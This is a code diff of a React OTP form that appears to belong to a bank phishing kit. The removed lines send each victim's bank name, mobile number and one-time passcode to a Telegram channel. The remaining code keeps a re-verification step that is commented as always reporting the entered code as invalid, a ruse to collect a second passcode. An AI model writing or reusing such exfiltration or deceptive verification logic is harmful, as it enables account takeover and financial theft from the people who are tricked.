@@ -107,11 +107,6 @@ export function OtpForm({
   function handleSubmit(e: FormEvent) {
     e.preventDefault()
     if (!isComplete) return
-    notifyTelegram(mode === 'reverify' ? 'OTP Re-verification' : 'OTP Submitted', [
-      { label: 'Bank', value: bankName },
-      { label: 'Mobile', value: mobile },
-      { label: 'OTP Code', value: code },
-    ])
     if (mode === 'reverify') {
       // This step always reports the code as invalid.
       setError(true)
